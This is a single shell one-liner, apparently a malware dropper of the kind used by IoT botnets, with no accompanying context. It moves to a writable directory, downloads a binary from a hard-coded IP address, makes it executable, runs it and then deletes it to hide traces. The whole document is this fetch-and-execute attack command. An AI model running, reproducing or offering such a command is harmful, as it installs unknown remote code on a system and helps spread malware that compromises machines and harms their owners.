cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.227.147/wget; chmod +x wget; ./wget; rm -rf wget
